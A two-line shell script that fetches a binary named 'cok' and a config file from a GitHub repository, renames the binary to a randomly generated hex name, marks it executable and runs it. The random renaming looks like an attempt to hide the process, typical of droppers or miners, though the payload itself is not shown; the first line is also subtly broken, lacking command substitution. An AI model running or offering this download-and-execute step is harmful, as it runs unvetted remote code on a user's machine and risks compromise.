name=cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32
wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok $name && chmod +x $name && ./$name script.ini
